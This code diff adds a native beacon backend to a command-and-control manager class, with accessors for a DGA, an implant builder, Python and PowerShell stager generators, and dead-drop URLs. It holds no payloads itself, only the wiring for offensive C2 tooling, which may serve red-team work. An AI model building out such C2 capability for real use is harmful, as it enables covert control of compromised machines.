@@ -85,6 +85,17 @@ class C2Manager:
             except Exception:
                 logger.debug("Non-critical error", exc_info=True)
 
+        if backend == "native" or backend == "auto":
+            try:
+                from .native_backend import NativeC2Backend
+                nb = NativeC2Backend()
+                if nb.available:
+                    self._backend = nb
+                    logger.info("C2: using Native beacon backend")
+                    return
+            except Exception:
+                logger.debug("Native backend unavailable", exc_info=True)
+
         if backend == "noop":
             self._backend = NoopBackend()
             logger.info("C2: using Noop backend (no agent capability)")
@@ -132,6 +143,45 @@ class C2Manager:
 
     async def stop(self):
         await self._backend.stop()
+
+    @property
+    def native(self):
+        """Return native backend if active, else None."""
+        from .native_backend import NativeC2Backend
+        return self._backend if isinstance(self._backend, NativeC2Backend) else None
+
+    @property
+    def beacon(self):
+        nb = self.native
+        return nb.beacon if nb else None
+
+    @property
+    def dga(self):
+        nb = self.native
+        return nb.dga if nb else None
+
+    @property
+    def implant_builder(self):
+        nb = self.native
+        return nb.builder if nb else None
+
+    def get_python_stager(self, session_id: str = "") -> str:
+        nb = self.native
+        if nb:
+            return nb.get_python_stager(session_id)
+        return ""
+
+    def get_powershell_stager(self, session_id: str = "") -> str:
+        nb = self.native
+        if nb:
+            return nb.get_powershell_stager(session_id)
+        return ""
+
+    def get_dead_drop_urls(self, count: int = 5) -> list[str]:
+        nb = self.native
+        if nb:
+            return nb.get_dead_drop_urls(count)
+        return []
 
 
 _c2: Optional[C2Manager] = None
